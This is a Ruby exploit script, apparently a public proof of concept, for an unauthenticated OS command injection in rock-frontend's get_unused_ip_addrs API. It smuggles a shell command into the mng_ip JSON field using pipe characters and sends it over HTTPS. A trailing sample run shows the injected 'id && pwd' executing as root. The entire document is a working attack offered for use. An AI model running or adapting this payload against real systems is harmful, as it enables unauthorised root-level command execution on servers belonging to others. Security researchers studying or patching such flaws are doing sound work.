#!/usr/bin/env ruby 
# https://github.com/grantcurell/rock-frontend/
#
# rock-frontend kickstart_controller.py does not 
# sanitize user input in get_unused_ip_addrs() allowing 
# for remote unauthenticated code execution.

require 'rex'
require 'json'

host =  ARGV[0]
cmd  =  ARGV[1] || 'whoami'

def usage
 puts '[*] rock-frontend mng_ip OS Command Injection'
 puts "[*] #{$0} <target> [os command]"
 exit
end

usage if ARGV.size < 1

begin

sock =  Rex::Proto::Http::Client.new(host, 443, context = {}, ssl = true)

json = %Q|{"mng_ip":"#{host}\|#{cmd}\|\|''\|","netmask":"255.255.255.0"}|

res = sock.request_cgi(
	{
		'uri'     => '/api/get_unused_ip_addrs',
		'version' => '1.1',
		'method'  => 'POST',
                'ctype'   => 'application/json',
                'data'    => json,
                'headers '  => {
                   'Accept'  => 'application/json, text/plain, */*',
                   'Referer' => 'https://#{host}/kickstart',
                }
	})

sock.send_request(res)
recv = sock.read_response()
puts JSON.parse(recv.body)
rescue => e
puts "[!] #{e.to_s}"
end
__END__
mc@vato:/tmp$ ruby rock-frontend_exploit_1.rb 192.168.3.131 "id && pwd"
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
/opt/rock-frontend/backend
